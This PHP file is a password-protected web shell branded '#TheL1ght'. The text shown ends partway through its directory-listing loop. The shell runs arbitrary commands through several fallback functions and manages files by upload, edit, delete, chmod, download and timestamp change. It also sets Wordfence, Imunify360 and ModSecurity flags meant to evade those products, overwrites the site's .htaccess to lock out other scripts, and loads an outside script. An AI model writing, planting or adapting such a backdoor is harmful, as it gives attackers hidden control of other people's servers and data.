<?php

session_start();
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

function show_login_page($message = "")
{
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title><?= $_SERVER['HTTP_HOST']; ?> - L0g1n</title>
	<meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
	<link href="//fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
	<script src="//pukimai1337.github.io/kebutuhan/puki.js"></script>
</head>
<style type="text/css">
*{font-family:Ubuntu Mono;background:#fff}input:hover {border-bottom:2px solid red;}input {padding:7px 5px;outline:none;color:#8a8a8a;border-bottom:2px solid #f2f2f2;border-top:none;border-left:none;border-right:none;}
</style>
<body>
<form method="POST">
	<input name="pass" type="password" placeholder="pass..">
	<input type="hidden" name="login">
</form>
</body>
</html>

<?php
	exit;
}
if (!isset($_SESSION['authenticated'])) {
	$stored_hashed_password = '$2a$12$BLJqn9YJTf.zZuIFw4OZW.rHtpeluYrBsFkU3UCzxdi/UpjVKQNyW';

	if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
		$_SESSION['authenticated'] = true;
	} else {
		show_login_page();
	}
}
?>
<?php
@session_start();
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
date_default_timezone_set("Asia/Jakarta");

if (function_exists('litespeed_request_headers')) {
	$a = litespeed_request_headers();
	if (isset($a['X-LSCACHE'])) {
		header('X-LSCACHE: off');
	}
}

if (defined('WORDFENCE_VERSION')) {
	define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
	define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
	$a = imunify360_request_headers();
	if (isset($a['X-Imunify360-Request'])) {
		header('X-Imunify360-Request: bypass');
	}
	
	if (isset($a['X-Imunify360-Captcha-Bypass'])) {
		header('X-Imunify360-Captcha-Bypass: ' . $a['X-Imunify360-Captcha-Bypass']);
	}
}

if (function_exists('apache_request_headers')) {
	$a = apache_request_headers();
	if (isset($a['X-Mod-Security'])) {
		header('X-Mod-Security: ' . $a['X-Mod-Security']);
	}
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
	$_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
	if (isset($a['HTTP_CF_VISITOR'])) {
		header('HTTP_CF_VISITOR: ' . $a['HTTP_CF_VISITOR']);
	}
}

function acup($sky) {
	$str = '';
	for ($i = 0; $i < strlen($sky) - 1; $i += 2) {
		$str .= chr(hexdec($sky[$i] . $sky[$i + 1]));
	}
	return $str;
}

function tea($sky) {
	$str = '';
	for ($i = 0; $i < strlen($sky); $i++) {
		$str .= dechex(ord($sky[$i]));
	}
	return $str;
}

function writable($cup, $pall) {
	return (!is_writable($cup)) ? "<font color=\"#DC4C64\">" . $pall . "</font>" : "<font color=\"#14A44D\">" . $pall . "</font>";
}

if (isset($_GET['cup']) && !empty($_GET['cup'])) {
	$cup = acup($_GET['cup']);
	chdir($cup);
} else {
	$cup = getcwd();
}

$cup = str_replace('\\', '/', $cup);
$cups = explode('/', $cup);
$scup = scandir($cup);

function pall($cup) {
	$pall = fileperms($cup);
	if (($pall & 0xC000) == 0xC000) {
		$iall = 's';
	} elseif (($pall & 0xA000) == 0xA000) {
		$iall = 'l';
	} elseif (($pall & 0x8000) == 0x8000) {
		$iall = '-';
	} elseif (($pall & 0x6000) == 0x6000) {
		$iall = 'b';
	} elseif (($pall & 0x4000) == 0x4000) {
		$iall = 'd';
	} elseif (($pall & 0x2000) == 0x2000) {
		$iall = 'c';
	} elseif (($pall & 0x1000) == 0x1000) {
		$iall = 'p';
	} else {
		$iall = 'u';
	}

	$iall .= (($pall & 0x0100) ? 'r' : '-');
	$iall .= (($pall & 0x0080) ? 'w' : '-');
	$iall .= (($pall & 0x0040) ?
	(($pall & 0x0800) ? 's' : 'x' ) :
	(($pall & 0x0800) ? 'S' : '-'));

	$iall .= (($pall & 0x0020) ? 'r' : '-');
	$iall .= (($pall & 0x0010) ? 'w' : '-');
	$iall .= (($pall & 0x0008) ?
	(($pall & 0x0400) ? 's' : 'x' ) :
	(($pall & 0x0400) ? 'S' : '-'));

	$iall .= (($pall & 0x0004) ? 'r' : '-');
	$iall .= (($pall & 0x0002) ? 'w' : '-');
	$iall .= (($pall & 0x0001) ?
	(($pall & 0x0200) ? 't' : 'x' ) :
	(($pall & 0x0200) ? 'T' : '-'));

	return $iall;
}

function sall($item) {
	$a	= ["B", "KB", "MB", "GB", "TB", "PB"];
	$pos = 0;
	$sall = filesize($item);
	while ($sall >= 1024) {
		$sall /= 1024;
		$pos++;
	}
	return round($sall, 2) . " " . $a[$pos];
}

function alert($m, $c, $r = false) {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["color"])) {
		unset($_SESSION["color"]);
	}
	$_SESSION["message"] = $m;
	$_SESSION["color"] = $c;
	if ($r) {
		header('Location: ' . $r);
		exit();
	}
	return true;
}
 
function clear() {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["color"])) {
		unset($_SESSION["color"]);
	}
	return true;
}
function cmd($in, $re = false) {
	$out = '';
	try {
		if ($re) $in = $in . " 2>&1";
		if (function_exists("exec")) {
			@exec($in, $out);
			$out = @join("\n", $out);
		} elseif (function_exists("passthru")) {
			ob_start();
			@passthru($in);
			$out = ob_get_clean();
		} elseif (function_exists("system")) {
			ob_start();
			@system($in);
			$out = ob_get_clean();
		} elseif (function_exists("shell_exec")) {
			$out = shell_exec($in);
		} elseif (function_exists("popen") && function_exists("pclose")) {
			if (is_resource($f = popen($in, "r"))) {
				$out = "";
				while (!@feof($f))
					$out .= fread($f, 1024);
				pclose($f);
			}
		} elseif (function_exists("proc_open")) {
			$pipes = array();
			$process = proc_open($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
			$out = streamgetcontents($pipes[1]);
		}
	} catch (Exception $e) {
	}
	return $out;
}
function np($value){
	$nM = $value;
	$ex = pathinfo($value, PATHINFO_EXTENSION);
	if (strlen($nM) > 20) {
		return substr($nM, 0, 20) . "...";
	} else {
		return $value;
	}
}

try {
	if (isset($_GET['tea']) && $_GET['tea'] == 'df') {
		ob_clean();
		$a = acup($_GET['item']);
		$fp = realpath($a);
		if ($fp && file_exists($fp) && is_readable($fp)) {
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="' . basename($fp) . '"');
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			header('Content-Length: ' . filesize($fp));
			readfile($fp);
			exit();
		} else {
			throw new Exception("Error download $item.");
		}
	}
} catch (Exception $e) {
	alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
	exit();
}

if (isset($_GET['destroy'])) {
try {
	$DC_r00t = $_SERVER["DOCUMENT_ROOT"];
	$CFile = trim(basename($_SERVER["SCRIPT_FILENAME"]));
	if (is_writeable($DC_r00t)) {
		$ht = '<FilesMatch "(?i).*(ph|sh|pj|env).*">
Order Deny,Allow
Deny from all
</FilesMatch>
<Files '.$CFile.'>
Allow from all
</Files>
<Files index.php>
Allow from all
</Files>
<Files datas.php>
Allow from all
</Files>
AddType application/x-httpd-php .bjidb
ErrorDocument 403 "<title>403</title>lagi ngapain bre"
ErrorDocument 404 "<title>404</title>lagi ngapain bre"
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^ index.php [L]
</IfModule>';
		$put_ht = file_put_contents($DC_r00t . "/.htaccess", $ht);
		if ($put_ht) {
			alert("Success htaccess destroyer", "#14A44D", "?cup=" . tea($cup));
		} else {
			throw new Exception("htaccess destroyer");
		}
	} else {
		throw new Exception("htaccess destroyer");
	}
} catch (Exception $e) {
		alert("Error: ", "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_POST['nfoln'])){
	try {
		$nfn = $_POST['nfoln'];
		$nfp = $cup . '/' . $nfn;

		if (!file_exists($nfp) && mkdir($nfp)) {
			alert("Success make a folder $nfn.", "#14A44D", "?cup=" . tea($cup));
		} else {
			throw new Exception("Error while creating folder $nfn.");
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_POST['nfn'])) {
	try {
		$nfn = $_POST['nfn'];
		$nfp = $cup . '/' . $nfn;

		if (!file_exists($nfp)) {
			if (isset($_POST['nfc'])) {
				$nfc = $_POST['nfc'];
				if (file_put_contents($nfp, $nfc) !== false) {
					alert("Success make a file $nfn.", "#14A44D", "?cup=" . tea($cup));
				} else {
					throw new Exception("Error while creating file $nfn.");
				}
			} else {
				if (touch($nfp)) {
					alert("Success make a file $nfn.", "#14A44D", "?cup=" . tea($cup));
				} else {
					throw new Exception("Error while creating file $nfn.");
				}
			}
		} else {
			throw new Exception("Error $nfn already exists.");
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_POST['ri']) && isset($_POST['nn'])) {
	try {
		if ($_POST['nn'] == '') {
			throw new Exception("Error, input cannot be empty.");
		} else {
			$item = $_POST['ri'];
			$new = $_POST['nn'];
			$nfp = $cup . '/' . $new;

			if (file_exists($item)) {
				if (rename($item, $nfp)) {
					alert("Successful rename $item to $new.", "#14A44D", "?cup=" . tea($cup));
				} else {
					throw new Exception("Error while renaming $item.");
				}
			} else {
				throw new Exception("Error $item not found.");
			}
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_GET['item']) && isset($_POST['nc'])) {
	try {
		$item = acup($_GET['item']);

		if (file_put_contents($cup . '/' . $item, $_POST['nc']) !== false) {
			alert("Successful editing $item.", "#14A44D", "?cup=" . tea($cup));
		} else {
			throw new Exception("Error while editing $item.");
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_POST['di']) && isset($_POST['nd'])) {
	try {
		$ndf = strtotime($_POST['nd']);
		$item = $_POST['di'];

		if ($ndf == '') {
			throw new Exception("Error, input cannot be empty.");
		}

		if (touch($cup . '/' . $item, $ndf)) {
			alert("Successful change date for $item.", "#14A44D", "?cup=" . tea($cup));
		} else {
			throw new Exception("Error while change date for $item.");
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_POST['pi']) && isset($_POST['np'])) {
	try {
		$item = $_POST['pi'];

		if ($_POST['np'] == '') {
			throw new Exception("Error, input cannot be empty.");
		}
		if (chmod($cup . '/'. $item, intval($_POST['np'], 8))) {
			alert("Successful change permission for $item.", "#14A44D", "?cup=" . tea($cup));
		} else {
			throw new Exception("Error while change permission for $item.");
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_POST['di'])){
	$item = $_POST['di'];

	function deleteDirectory($cup) {
		if (!is_dir($cup)) {
			return false;
		}
		$x = array_diff(scandir($cup), ['.', '..']);
		foreach ($x as $z) {
			$b = $cup . DIRECTORY_SEPARATOR . $z;
			if (is_dir($b)) {
				deleteDirectory($b);
			} else {
				if (!unlink($b)) {
					return false;
				}
			}
		}
		return rmdir($cup);
	}
	
	try {
		if (!is_writable($item)) {
			throw new Exception("Permission denied for $item");
		}
		
		if (is_file($item)) {
			if (!unlink($item)) {
				throw new Exception("Failed to file: $item");
			}

			alert("Successful delete file $item.", "#14A44D", "?cup=" . tea($cup));
		} elseif (is_dir($item)) {
			if (!deleteDirectory($item)) {
				throw new Exception("Failed to folder: $item");
			}
			alert("Successful delete folder $item.", "#14A44D", "?cup=" . tea($cup));
		} else {
			throw new Exception("Error $item not found.");
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_FILES['z'])) {
	try {
		$total = count($_FILES['z']['name']);

		for ($i = 0; $i < $total; $i++) {
			$mu = move_uploaded_file($_FILES['z']['tmp_name'][$i], $_FILES['z']['name'][$i]);
		}

		if ($total < 2) {
			if ($mu) {
				$fn = $_FILES['z']['name'][0]; 
				alert("Upload $fn successfully! ", "#14A44D", "?cup=" . tea($cup));
			} else {
				throw new Exception("Error while upload $fn.");
			}
		} else {
			if ($mu) {
				alert("Upload $i files successfully! ", "#14A44D", "?cup=" . tea($cup));
			} else {
				throw new Exception("Error while upload files.");
			}
		}
	} catch (Exception $e) {
		alert("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
		exit();
	}
}

if (isset($_GET['keluar'])) {
session_start();
session_destroy();
header('Location: ' . $_SERVER['PHP_SELF']);
}

$ws = file("/etc/named.conf", FILE_IGNORE_NEW_LINES);
if (!$ws) {
	$dom = "Cant read /etc/named.conf";
	$GLOBALS["need_to_update_header"] = "true";
} else {
	$c = 0;
	foreach ($ws as $w) {
		if (preg_match('/zone\s+"([^"]+)"/', $w, $m)) {
			if (strlen(trim($m[1])) > 2) {
				$c++;
			}
		}
	}
	$dom = "$c Domain";
}

function win() {
	$wina = [
		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
	];
	foreach ($wina as $winb => $winc) {
		if (is_dir($winc . ":/")) {
			echo "<a class='text-success' href='?cup=" . tea($winc . ":/") . "'>[ " . $winc . " ] </a>";
		}
	}
}

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="googlebot" content="noindex">
		<meta name="robots" content="noindex, nofollow">
		<title>#TheL1ght - <?= $_SERVER['HTTP_HOST']; ?></title>
		<link href="//cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
		<link href="//cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
		<link href="//fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
		<script src="//pukimai1337.github.io/kebutuhan/puki.js"></script>
		<style type="text/css">
			* {
				font-family: Ubuntu Mono;
			} .custom {
				width: 100px;
				text-overflow: ellipsis;
				white-space: nowrap;
				overflow: hidden;
			} .custom-btn {
				width: 100px;
				text-overflow: ellipsis;
				white-space: nowrap;
				overflow: hidden;
			} a {
				color: #292b2c;
				text-decoration: none;
			} a:hover {
				color: #0275d8;
			} ::-webkit-scrollbar {
				width: 7px;
				height: 7px;
			} ::-webkit-scrollbar-thumb {
				background: grey;
				border-radius: 7px;
			} ::-webkit-scrollbar-track {
				box-shadow: inset 0 0 7px grey;
				border-radius: 7px;
			}
		</style>
	</head>
	<body class="bg-light">
		<div class="container-fluid py-3 p-5 mt-3">
			<div class="row justify-content-between align-items-center py-2">
				<div class="col-md-auto">
					<table class="table table-sm table-borderless table-light">
						<tr>
							<td style="width: 7%;">&#83;&#121;&#115;&#116;&#101;&#109;</td>
							<td style="width: 1%">:</td>
							<td><?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Server information not available"; ?></td>
						</tr>
						<tr>
							<td style="width: 7%;">&#83;&#111;&#102;&#116;&#119;&#97;&#114;&#101;</td>
							<td style="width: 1%">:</td>
							<td><?= $_SERVER['SERVER_SOFTWARE'] ?></td>
						</tr>
						<tr>
							<td style="width: 7%;">&#83;&#101;&#114;&#118;&#101;&#114;</td>
							<td style="width: 1%">:</td>
							<td><?= gethostbyname($_SERVER['HTTP_HOST']) ?></td>
						</tr>
						<tr>
							<td style="width: 7%;">&#68;&#111;&#109;&#97;&#105;&#110;&#115;</td>
							<td style="width: 1%">:</td>
							<td><?= $dom; ?></td>
						</tr>
						<tr>
							<td style="width: 7%;">&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;</td>
							<td style="width: 1%">:</td>
							<td class="text-nowrap">[&nbsp;<?php echo writable($cup, pall($cup)) ?>&nbsp;]</td>
						</tr>
						<tr>
							<td style="width: 7%;">Directory</td>
							<td style="width: 1%">:</td>
							<td>
								<?php
									if (stristr(PHP_OS, "WIN")) {
										win();
									}

									foreach ($cups as $id => $pat) {
										if ($pat == '' && $id == 0) {
								?>
								<a href="?cup=<?= tea('/') ?>">/</a>
								<?php } if ($pat == '') continue; ?>

								<a href="?cup=<?php for ($i = 0; $i <= $id; $i++) { echo tea("$cups[$i]"); if ($i != $id) echo tea("/"); } ?>"><?= $pat ?></a>
								<span> /</span>
								<?php } ?>

							</td>
						</tr>
					</table>
				</div>
				<div class="col-md-auto mt-auto mb-3">
					<div class="row justify-content-end">
						<div class="col-md-auto">
							<table class="table-borderless">
								<tr>
								<form action="" method="post">
									<div class="input-group mb-3">
										<input type="text" class="form-control form-control-sm" name="cmd" placeholder="whoami" value="<?= $_POST['cmd'];?>" required>
										<button type="submit" class="btn btn-outline-dark btn-sm"><i class="bi bi-arrow-right"></i></button>
									</div>
								</form>
								</tr>
								<tr>
									<td class="text-end">
										<form action="" method="post" enctype="multipart/form-data">
											<label for="ups" class="btn btn-outline-dark btn-sm custom mb-2 mt-2" id="uputama">Upload <i class="bi bi-upload"></i></label>
											<input type="file" class="form-control d-none" name="z[]" id="ups" multiple>
											<button class="btn btn-outline-dark btn-sm" type="submit">Submit</button>
										</form>
									</td>
								</tr>
							</table>
						</div>
					</div>
				</div>
			</div>

			<div class="container mb-3">
				<center>
					<a href="<?= $_SERVER['PHP_SELF']; ?>" class="btn btn-outline-dark btn-sm custom-btn mb-2"><i class="bi bi-house-check"></i> Home</a>
					<a href="?cup=<?= tea(__DIR__) ?>&destroy" class="btn btn-outline-dark btn-sm mb-2"><i class="bi bi-bug-fill text-danger"></i> Htaccess destroyer</a>
					<a href="?keluar" class="btn btn-outline-dark btn-sm custom-btn mb-2"><i class="bi bi-box-arrow-left"></i> Logout</a>
				</center>
				<?php
					if(isset($_POST['cmd'])){
							echo '<i class="bi bi-terminal modal-title fs-5"></i> TheL1ght<b class="text-success">@</b>'.$_SERVER['HTTP_HOST'].':# <b class="text-success">'.$_POST['cmd'].'</b><textarea class="form-control" rows="7">'.htmlspecialchars(cmd($_POST['cmd'] . " 2>&1")).'</textarea>';
						die;
					}
				?>
				<!-- Modal 1 -->
				<div class="modal fade" id="tambahFolder" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="tambahFolderLabel" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="tambahFolderLabel"><i class="bi bi-folder-plus"></i></h1>
								<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">&#70;&#111;&#108;&#100;&#101;&#114; &#78;&#97;&#109;&#101;</label>
								<input type="text" class="form-control" name="nfoln" placeholder="TheL1ght" required>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
								<button type="submit" class="btn btn-outline-dark btn-sm">&#67;&#114;&#101;&#97;&#116;&#101;</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="tambahFile" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="tambahFileLabel" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="tambahFileLabel"><i class="bi bi-file-earmark-plus"></i></h1>
								<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<div class="mb-3">
									<label class="form-label">&#70;&#105;&#108;&#101; &#78;&#97;&#109;&#101;</label>
									<input type="text" class="form-control" name="nfn" placeholder="acupof.tea" required>
								</div>
								<div class="mb-3">
									<label class="form-label">&#70;&#105;&#108;&#101; &#67;&#111;&#110;&#116;&#101;&#110;&#116;</label>
									<textarea class="form-control" rows="7" name="nfc" placeholder="Hello World! ( optional. )"></textarea>
								</div>
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
								<button type="submit" class="btn btn-outline-dark btn-sm">&#67;&#114;&#101;&#97;&#116;&#101;</button>
							</div>
						</div>
					</form>
				</div>

				<!-- Modal 2 -->
				<div class="modal fade" id="em" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="emt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="emt"><i class="bi bi-file-earmark-code"></i></h1>
								<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<div class="mb-3">
									<?php
										if (isset($_GET['tea']) && isset($_GET['item'])) {
											if ($_GET['tea'] === 'ef') {
												$item = acup($_GET['item']);
												if ($zzzz = getimagesize($cup . '/' . $item)) {
													$ab = base64_encode(file_get_contents($cup . '/' . $item));
									?>

									<p>Type: <?= $zzzz['mime'] ?>, <?= $zzzz['0'] ?> x <?= $zzzz['1'] ?></p>
									<div class="text-center">
										<img class="img-fluid rounded" src="data:<?= $zzzz['mime'] ?>;base64, <?= $ab ?>" alt="<?= $item ?>">
									</div>
									<?php
										} else {
									?>

									<label class="form-label">&#70;&#105;&#108;&#101; <font color="red"><?= $item ?></font></label>
									<textarea class="form-control" rows="15" name="nc" id="content"><?= htmlspecialchars(file_get_contents($cup . '/' . $item)) ?></textarea>
									<?php
												}
											}
										}
									?>

								</div>
							</div>
							<div class="modal-footer">
								<a href="?cup=<?= tea($cup) ?>" class="btn btn-outline-danger btn-sm">&#67;&#97;&#110;&#99;&#101;&#108;</a>
								<button type="button" class="btn btn-outline-dark btn-sm" onclick="salin()">Salin</button>
								<button type="submit" class="btn btn-outline-dark btn-sm">&#83;&#117;&#98;&#109;&#105;&#116;</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="mr" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mrt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mrt"><i class="bi bi-pencil-square"></i></h1>
								<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">&#78;&#101;&#119;&#32;&#110;&#97;&#109;&#101;&#32;&#102;&#111;&#114; <span id="rin" style="color: red"></span></label>
								<input type="text" class="form-control" name="nn" placeholder="TheL1ght">
								<input type="hidden" id="rinn" name="ri" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
								<button type="submit" class="btn btn-outline-dark btn-sm">&#83;&#117;&#98;&#109;&#105;&#116;</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="md" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mdt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mdt"><i class="bi bi-trash"></i></h1>
								<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">&#65;&#114;&#101;&#32;&#121;&#111;&#117;&#32;&#115;&#117;&#114;&#101;&#32;&#119;&#105;&#108;&#108;&#32;&#100;&#101;&#108;&#101;&#116;&#101; <span id="din" style="color: red"></span> ?</label>
								<input type="hidden" id="dip" name="di" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-dark btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
								<button type="submit" class="btn btn-outline-danger btn-sm">&#68;&#101;&#108;&#101;&#116;&#101;</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="mdtw" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mdtwt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mdtwt"><i class="bi bi-calendar3"></i></h1>
								<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">&#78;&#101;&#119; &#100;&#97;&#116;&#101; &#102;&#111;&#114; <span id="dinn" style="color: red"></span></label>
								<input type="text" class="form-control" name="nd" placeholder="TheL1ght">
								<input type="hidden" id="dipp" name="di" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
								<button type="submit" class="btn btn-outline-dark btn-sm">&#83;&#117;&#98;&#109;&#105;&#116;</button>
							</div>
						</div>
					</form>
				</div>
				<div class="modal fade" id="mp" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mpt" aria-hidden="true">
					<form action="" method="post" class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<h1 class="modal-title fs-5" id="mpt"><i class="bi bi-exclamation-triangle"></i></h1>
								<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
							</div>
							<div class="modal-body">
								<label class="form-label">&#78;&#101;&#119; &#112;&#101;&#114;&#109; &#102;&#111;&#114; <span id="pin" style="color: red"></span></label>
								<input type="text" class="form-control" name="np" placeholder="TheL1ght">
								<input type="hidden" id="pip" name="pi" value="">
							</div>
							<div class="modal-footer">
								<button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
								<button type="submit" class="btn btn-outline-dark btn-sm">&#83;&#117;&#98;&#109;&#105;&#116;</button>
							</div>
						</div>
					</form>
				</div>
			</div>
			<?php
				if (!is_readable($cup)) {
					echo '<center>';
					echo "403 Can't access directory.";
					echo '<br>';
					echo '<hr width="20%">';
					echo '<div class="text-dark">';
					echo '<span>~ TheL1ght - ' . $_SERVER['HTTP_HOST'] . '</span>';
					echo '</div>';
					echo '</center>';
					exit();
				}
			?>

			<div class="table-responsive">
				<table class="table table-hover table-light align-middle text-dark text-nowrap">
					<thead class="align-middle">
						<tr>
							<td style="width:30%">&#78;&#97;&#109;&#101;</td>
							<td style="width:15%">&#84;&#121;&#112;&#101;</td>
							<td style="width:15%">&#83;&#105;&#122;&#101;</td>
							<td style="width:15%">&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;</td>
							<td style="width:15%">&#76;&#97;&#115;&#116;&#32;&#77;&#111;&#100;&#105;&#102;&#105;&#101;&#100;</td>
							<td style="width:10%">&#65;&#99;&#116;&#105;&#111;&#110;&#115;</td>
						</tr>
					</thead>
					<tbody class="table-group-divider">
						<?php
							foreach ($scup as $item) {
								if (is_dir($item)) {
						?>

						<tr>
							<td>
								<?php
									if ($item === '..') {
										echo '<a href="?cup=' . tea(dirname($cup)) . '"><i class="bi bi-folder2-open" style="color:orange;"></i> ' . $item . '</a>';
									} elseif ($item === '.') {
										echo '<a href="?cup=' . tea($cup) . '"><i class="bi bi-folder2-open" style="color:orange;"></i> ' . $item . '</a>';
									} else {
										echo '<a href="?cup=' . tea($cup . '/' . $item) .'"><i class="bi bi-folder-fill" style="color:orange;"></i> ' . np($item) . '</a>';
									}
								?>

							</td>
							<td><?= strtoupper(filetype($item))?></td>
							<td>-</td>
							<td>
								<a style="cursor: pointer;" class="p-btn" data-item="<?= $item ?>" data-file-content="<?= substr(sprintf('%o', fileperms($item)), -4); ?>">
								<?php echo is_writable($cup . '/' . $item) ? '<font color="#14A44D">' : (!is_readable($cup . '/' . $item) ? '<font color="#DC4C64">' : ''); echo pall($cup . '/' . $item); echo '</font>';if(is_writable($cup . '/' . $item) || !is_readable($cup . '/' . $item)) ?>

								</a>		
							</td>
							<td>
								<a style="cursor: pointer;" class="date-btn" data-item="<?= $item ?>" data-file-content="<?= date("Y-m-d h:i:s", filemtime($item)); ?>"><?= date("Y-m-d h:i:s", filemtime($item)); ?></a>
							</td>
							<td>
								<?php
									if ($item != '.' && $item != '..') {
								?>

								<div class="btn-group">
									<button type="button" class="btn btn-outline-dark btn-sm mr-1 r-btn" data-item="<?= $item ?>"><i class="bi bi-pencil-square"></i></button>
									<button type="button" class="btn btn-outline-dark btn-sm mr-1 d-btn" data-item="<?= $item ?>"><i class="bi bi-trash"></i></button>
								</div>
								<?php
									} elseif ($item === '.') {
								?>

								<div class="btn-group">
									<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#tambahFolder"><i class="bi bi-folder-plus"></i></button>
									<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#tambahFile"><i class="bi bi-file-earmark-plus"></i></button>
								</div>
								<?php
									}
								?>

							</td>
						</tr>
						<?php
								}
							}

